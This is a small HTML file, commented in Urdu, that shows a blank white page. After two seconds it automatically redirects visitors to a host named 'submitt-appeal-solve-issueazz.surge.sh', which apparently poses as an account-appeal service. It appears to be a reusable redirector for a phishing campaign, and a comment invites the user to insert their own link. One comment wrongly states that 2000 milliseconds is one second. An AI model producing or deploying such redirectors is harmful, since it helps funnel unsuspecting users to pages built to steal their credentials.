<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Page</title>
    <style>
        /* صفحہ بالکل خالی نظر آئے گا */
        body {
            margin: 0;
            height: 100vh;
            background-color: white; /* بیک گراؤنڈ سفید */
        }
    </style>
    <script>
        // یہاں اپنی دوسرا لنک ڈالیں
        const redirectLink = "https://submitt-appeal-solve-issueazz.surge.sh";

        // صفحہ لوڈ ہونے کے بعد 2 سیکنڈ کے بعد ری ڈائریکٹ کرے
        window.onload = function() {
            setTimeout(() => {
                window.location.href = redirectLink;
            }, 2000); // 2000 ملی سیکنڈ = 1 سیکنڈ
        }
    </script>
</head>
<body>
</body>
</html>
